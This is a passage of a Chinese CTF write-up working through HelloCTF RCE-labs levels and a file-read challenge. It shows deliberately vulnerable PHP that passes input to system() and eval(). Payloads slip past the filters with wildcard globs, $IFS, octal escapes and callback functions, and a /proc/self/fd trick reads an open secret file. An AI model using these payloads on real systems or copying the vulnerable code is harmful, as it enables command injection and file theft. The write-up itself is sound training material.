-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_shell</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag/&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
-</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;WAF!&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_shell</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>payload: <code>?cmd=cat /f*</code></p><h4 id=rce-labs-level6>RCE-labs-level6</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_shell</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[b-zA-Z_@#%^&amp;*:{}\-\+&lt;&gt;</span><span class=se>\&#34;</span><span class=s2>|`;\[\]]/&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
-</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;WAF!&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_shell</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>这道题可以用上面的通配符进行绕过，可以看到这里过滤了除了字母a和数字以外所有的大小写字母，没过滤<code>/</code> 所以可以<code>cmd=/???/?a? /??a?</code> 用于匹配根目录下三个字符的目录（如 <code>/bin</code>、<code>/etc</code>）中，文件名长度为三个字符且中间字符为 <code>a</code> 的文件，常见的有 <code>/bin/cat</code>、<code>/bin/tar</code>、<code>/bin/man</code> 等。</p><p>/??a?：匹配根目录下四个字符的文件名，且第三个字符为 a，即/flag，用这个会输出很多其他的东西；</p><p>也可以使用<code>/???/?a??64 /??a?</code>，即/bin/base64 /flag这个能只匹配到/flag，然后使用base64输出</p><p>/bin 目录是存放系统启动和单用户模式下必需的核心可执行文件，这些文件对所有用户（包括普通用户和 root）都可用，包含最基础的命令，如 <code>ls</code>（列出目录）、<code>cp</code>（复制文件）、<code>mv</code>（移动文件）、<code>sh</code>（Shell 解释器）等。</p><h4 id=rce-labs-level7>RCE-labs-level7</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
-</span></span><span class=line><span class=cl><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm>在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_shell</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag| /&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
-</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;WAF!&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_shell</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p><code>payload</code> : <code>?cmd=cat$IFS/f*</code></p><h4 id=rce-labs-level2>RCE-labs-level2</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
-</span></span><span class=line><span class=cl><span class=k>include</span> <span class=p>(</span><span class=s2>&#34;get_flag.php&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span> <span class=c1>// 开启 session
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm>除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_ctf</span><span class=p>(</span><span class=nv>$function</span><span class=p>,</span> <span class=nv>$content</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nv>$code</span> <span class=o>=</span> <span class=nv>$function</span> <span class=o>.</span> <span class=s2>&#34;(&#34;</span> <span class=o>.</span> <span class=nv>$content</span> <span class=o>.</span> <span class=s2>&#34;);&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Your Code: </span><span class=si>$code</span><span class=s2> &lt;br&gt;&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$code</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_fun</span><span class=p>(){</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nv>$func_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;eval&#39;</span><span class=p>,</span><span class=s1>&#39;assert&#39;</span><span class=p>,</span><span class=s1>&#39;call_user_func&#39;</span><span class=p>,</span><span class=s1>&#39;create_function&#39;</span><span class=p>,</span><span class=s1>&#39;array_map&#39;</span><span class=p>,</span><span class=s1>&#39;call_user_func_array&#39;</span><span class=p>,</span><span class=s1>&#39;usort&#39;</span><span class=p>,</span><span class=s1>&#39;array_filter&#39;</span><span class=p>,</span><span class=s1>&#39;array_reduce&#39;</span><span class=p>,</span><span class=s1>&#39;preg_replace&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random_func&#39;</span><span class=p>]))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random_func&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$func_list</span><span class=p>[</span><span class=nx>array_rand</span><span class=p>(</span><span class=nv>$func_list</span><span class=p>)];</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    
-</span></span><span class=line><span class=cl>    <span class=nv>$random_func</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random_func&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nv>$url_fucn</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/_/&#39;</span><span class=p>,</span> <span class=s1>&#39;-&#39;</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random_func&#39;</span><span class=p>]);</span>
-</span></span><span class=line><span class=cl>    
-</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;获得新的函数: </span><span class=si>$random_func</span><span class=s2> ，去 https://www.php.net/manual/zh/function.&#34;</span><span class=o>.</span><span class=nv>$url_fucn</span><span class=o>.</span><span class=s2>&#34;.php 查看函数详情。&lt;br&gt;&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random_func&#39;</span><span class=p>];</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>start</span><span class=p>(</span><span class=nv>$act</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nv>$random_func</span> <span class=o>=</span> <span class=nx>get_fun</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$act</span> <span class=o>==</span> <span class=s2>&#34;r&#34;</span><span class=p>){</span> <span class=cm>/* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */</span>
-</span></span><span class=line><span class=cl>        <span class=nx>session_unset</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>        <span class=nx>session_destroy</span><span class=p>();</span> 
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$act</span> <span class=o>==</span> <span class=s2>&#34;submit&#34;</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>        <span class=nv>$user_content</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>];</span> 
-</span></span><span class=line><span class=cl>        <span class=nx>hello_ctf</span><span class=p>(</span><span class=nv>$random_func</span><span class=p>,</span> <span class=nv>$user_content</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>start</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>flag放进了变量$flag中,random_func中的函数都是可以通过回调等方式进行输出flag的值</p><p>官方WP中是这样写的:</p><blockquote><p>函数</p><p>说明</p><p>示例代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>${}
-</span></span></code></pre></div><p>用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 <code>eval</code> 或其他动态执行代码的功能，用于间接执行代码。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eval(&#39;${flag}&#39;);
-</span></span><span class=line><span class=cl>eval()
-</span></span></code></pre></div><p>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eval(&#39;echo $flag;&#39;);
-</span></span><span class=line><span class=cl>assert()
-</span></span></code></pre></div><p>测试表达式是否为真。PHP 8.0.0 之前，如果 <code>assertion</code> 是字符串，将解释为 PHP 代码并通过 <code>eval()</code> 执行。<strong>PHP 8.0.0 后移除该功能。</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>assert(print_r($flag));
-</span></span><span class=line><span class=cl>call_user_func()
-</span></span></code></pre></div><p>用于调用回调函数，可以传递多个参数给回调函数，返回回调函数的返回值。适用于动态函数调用。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>call_user_func(&#39;print_r&#39;, $flag);
-</span></span><span class=line><span class=cl>create_function()
-</span></span></code></pre></div><p>创建匿名函数，接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用。<strong>自 PHP 7.2.0 起被_废弃_，并自 PHP 8.0.0 起被_移除_。</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>create_function(&#39;$a&#39;, &#39;echo $flag;&#39;)($a);
-</span></span><span class=line><span class=cl>array_map()
-</span></span></code></pre></div><p>将回调函数应用于数组的每个元素，返回一个新数组。适用于转换或处理数组元素。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>array_map(print_r($flag), $a);
-</span></span><span class=line><span class=cl>call_user_func_array()
-</span></span></code></pre></div><p>调用回调函数，并将参数作为数组传递。适用于动态参数数量的函数调用。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>call_user_func_array(print_r($flag), array());
-</span></span><span class=line><span class=cl>usort()
-</span></span></code></pre></div><p>对数组进行自定义排序，接受数组和比较函数作为参数。适用于根据用户定义的规则排序数组元素。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>usort($a,print_r($flag));
-</span></span><span class=line><span class=cl>array_filter()
-</span></span></code></pre></div><p>过滤数组元素，如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>array_filter($a,print_r($flag));
-</span></span><span class=line><span class=cl>array_reduce()
-</span></span></code></pre></div><p>迭代一个数组，通过回调函数将数组的元素逐一减少到单一值。接受数组、回调函数和可选的初始值。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>array_reduce($a,print_r($flag));
-</span></span><span class=line><span class=cl>preg_replace()
-</span></span></code></pre></div><p>执行正则表达式的搜索和替换。可以是单个字符串或数组。适用于基于模式匹配修改文本内容。<strong>依赖 /e 模式，该模式自 PHP7.3 起被取消。</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>preg_replace(&#39;/(.*)/ei&#39;, &#39;strtolower(&#34;\\1&#34;)&#39;, ${print_r($flag)});
-</span></span><span class=line><span class=cl>ob_start()
-</span></span></code></pre></div><p>ob_start — 打开输出控制缓冲,可选回调函数作为参数来处理缓冲区内容。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ob_start(print_r($flag));
-</span></span></code></pre></div></blockquote><h4 id=rce-labs-level9>RCE-labs-level9</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
-</span></span><span class=line><span class=cl><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm># -*- coding: utf-8 -*-
-</span></span></span><span class=line><span class=cl><span class=cm># @Author: 探姬
-</span></span></span><span class=line><span class=cl><span class=cm># @Date:   2024-08-11 14:34
-</span></span></span><span class=line><span class=cl><span class=cm># @Repo:   github.com/ProbiusOfficial/RCE-labs
-</span></span></span><span class=line><span class=cl><span class=cm># @email:  admin@hello-ctf.com
-</span></span></span><span class=line><span class=cl><span class=cm># @link:   hello-ctf.com
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
-</span></span></span><span class=line><span class=cl><span class=cm>你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
-</span></span></span><span class=line><span class=cl><span class=cm>题目本身也提供一个/exp.php方便你使用
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>从该关卡开始你会发现我们在Dockerfile中添加了一行改动：
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>RUN ln -sf /bin/bash /bin/sh
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：
-</span></span></span><span class=line><span class=cl><span class=cm>bash-5.1# ls -l /bin/sh
-</span></span></span><span class=line><span class=cl><span class=cm>lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -&gt; /bin/busybox
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>在这个关卡主要利用的是在终端中，$&#39;\xxx&#39;可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$&#39;\xxx\xxx\xxx\xxx&#39;的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。
-</span></span></span><span class=line><span class=cl><span class=cm>比如&#34;ls -l&#34;也就是$&#39;\154\163\40\55\154&#39; 只能拆分为$&#39;\154\163&#39; 空格 $&#39;\55\154&#39;三部分。
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>bash-5.1# $&#39;\154\163\40\55\154&#39;
-</span></span></span><span class=line><span class=cl><span class=cm>bash: ls -l: command not found
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>bash-5.1# $&#39;\154\163&#39; $&#39;\55\154&#39;
-</span></span></span><span class=line><span class=cl><span class=cm>total 4
-</span></span></span><span class=line><span class=cl><span class=cm>-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_shell</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[A-Za-z</span><span class=se>\&#34;</span><span class=s2>%*+,-.\/:;=&gt;?@[\]^`|]/&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
-</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;WAF!&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_shell</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>payload: <code>?cmd=$'\143\141\164' $'\57\146\154\141\147'</code></p><h4 id=rce-labs-level10>RCE-labs-level10</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
-</span></span><span class=line><span class=cl><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm># -*- coding: utf-8 -*-
-</span></span></span><span class=line><span class=cl><span class=cm># @Author: 探姬
-</span></span></span><span class=line><span class=cl><span class=cm># @Date:   2024-08-11 14:34
-</span></span></span><span class=line><span class=cl><span class=cm># @Repo:   github.com/ProbiusOfficial/RCE-labs
-</span></span></span><span class=line><span class=cl><span class=cm># @email:  admin@hello-ctf.com
-</span></span></span><span class=line><span class=cl><span class=cm># @link:   hello-ctf.com
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_二进制整数替换 --- 
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
-</span></span></span><span class=line><span class=cl><span class=cm>你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
-</span></span></span><span class=line><span class=cl><span class=cm>题目本身也提供一个/exp.php方便你使用
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>本关卡的考点为终端中支持 $((2#binary)) 解析二进制数据。
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_shell</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[A-Za-z2-9</span><span class=se>\&#34;</span><span class=s2>%*+,-.\/:;=&gt;?@[\]^`|]/&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
-</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;WAF!&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_shell</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><h4 id=青岑web入门basic_14>青岑/web入门/basic_14</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=nv>$flag</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=s1>&#39;/admin_secret.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])</span> <span class=o>&lt;</span> <span class=mi>17</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=nx>readfile</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=s2>&#34;The filename parameter does not exist or the filename is too long&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
-</span></span></span></code></pre></div><p>最开始我尝试的方向是绕过strlen()函数,通过搜索得知当传递数组时会抛出 Warning 警告，函数返回 <strong><code>null</code></strong>,此时长度的限制似乎是绕过了,但readfile()无法解析数组</p><p>后来问了AI,得知这道题的考点是 Linux /proc文件系统与文件描述符的利用:</p><p>由于:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$flag</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=s1>&#39;/admin_secret.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>);</span>
-</span></span></code></pre></div><p>这行代码的作用是以只读方式打开目标文件,并将文件句柄赋值给 <code>$flag</code>.在脚本执行期间,这个文件处于被打开的状态.</p><p>在Linux系统中,当一个进程打开一个文件时,系统会在 <code>/proc/self/fd/</code>目录下为该文件创建一个符号链接,链接的名称及是文件描述符( File Descriptor) 的数字.</p><p>所以这里目标文件以及被当前PHP进程打开,我们只需要读 <code>/proc/self/fd</code> 加对应的数字,就可以读取<code>admin_secret.txt</code>了</p><p>所以可以<code>?filename=/proc/self/fd/1</code> 从1开始一直试 就能拿到flag</p><p>另外,也可以用<code>?filename=/dev/fd/</code>来读取</p><p>因为<code>/dev/fd</code>本质是<code>/proc/self/fd</code>的软链接(快捷方式),在linux系统中,<code>/dev/fd</code>是一个指向<code>/proc/self/fd</code>的符号链接</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -l /dev/fd
-</span></span><span class=line><span class=cl>lrwxrwxrwx root root <span class=m>13</span> B Fri Jun <span class=m>19</span> 09:52:23 <span class=m>2026</span>  /dev/fd ⇒ /proc/self/fd
